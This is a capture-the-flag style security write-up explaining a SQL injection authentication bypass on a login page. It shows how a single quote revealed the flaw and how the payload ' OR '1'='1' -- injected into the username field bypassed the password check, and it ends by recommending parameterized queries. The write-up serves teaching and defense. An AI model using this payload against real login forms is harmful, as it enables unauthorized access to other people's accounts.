# SQL Injection — Authentication Bypass

**Category:** Web Exploitation  
**Technique:** SQL Injection  
**Difficulty:** Medium

## Challenge

The challenge provides a web application with a login page.

The objective is to identify whether the login functionality is vulnerable to SQL injection and bypass the authentication mechanism.

## Reconnaissance / Analysis

I first checked the login functionality using normal credentials.

```text
Username: admin
Password: test
```

The application returned:

```text
Invalid username or password
```

I then tested the username parameter with a single quote:

```text
'
```

The application response changed, which indicated that the input may be reaching the SQL query without being safely parameterized.

This suggested that the login functionality could be vulnerable to SQL injection.

## Vulnerability / Technique

The application can be represented as using a query similar to:

```sql
SELECT * FROM users
WHERE username = '<username>'
AND password = '<password>';
```

Because the input is directly included in the query, the SQL logic can potentially be modified.

A common authentication-bypass payload is:

```text
' OR '1'='1' --
```

The `1=1` condition always evaluates to true, while `--` comments out the remaining part of the query.

## Exploitation / Solution

I tested the following payload in the username field:

```text
' OR '1'='1' --
```

For the password field, any value can be supplied:

```text
anything
```

The resulting SQL logic becomes similar to:

```sql
SELECT * FROM users
WHERE username = '' OR '1'='1' --'
AND password = 'anything';
```

Since `'1'='1'` is always true, the authentication condition can be bypassed when the application is vulnerable.

## Result

The authentication mechanism can be bypassed without knowing a valid password.

The attack flow is:

```text
Login Page
    ↓
Input Testing
    ↓
SQL Injection Identified
    ↓
Authentication Query Manipulation
    ↓
Authentication Bypass
```

## Key Payload

```text
' OR '1'='1' --
```

## Lessons Learned

- Always test authentication parameters for SQL injection.
- A single quote can be useful for identifying SQL query injection.
- Boolean conditions can be used to manipulate vulnerable authentication queries.
- Input filtering alone is not a reliable defense against SQL injection.
- Parameterized queries should be used to prevent user input from being interpreted as SQL.

## Conclusion

This scenario demonstrates how improper handling of user input can allow an attacker to modify the application's SQL query and bypass authentication.

The main security issue is the direct use of user-controlled input inside an SQL query without proper parameterization.

> This is an original standalone security writeup and is not presented as a solution to an official RingZer0 challenge.
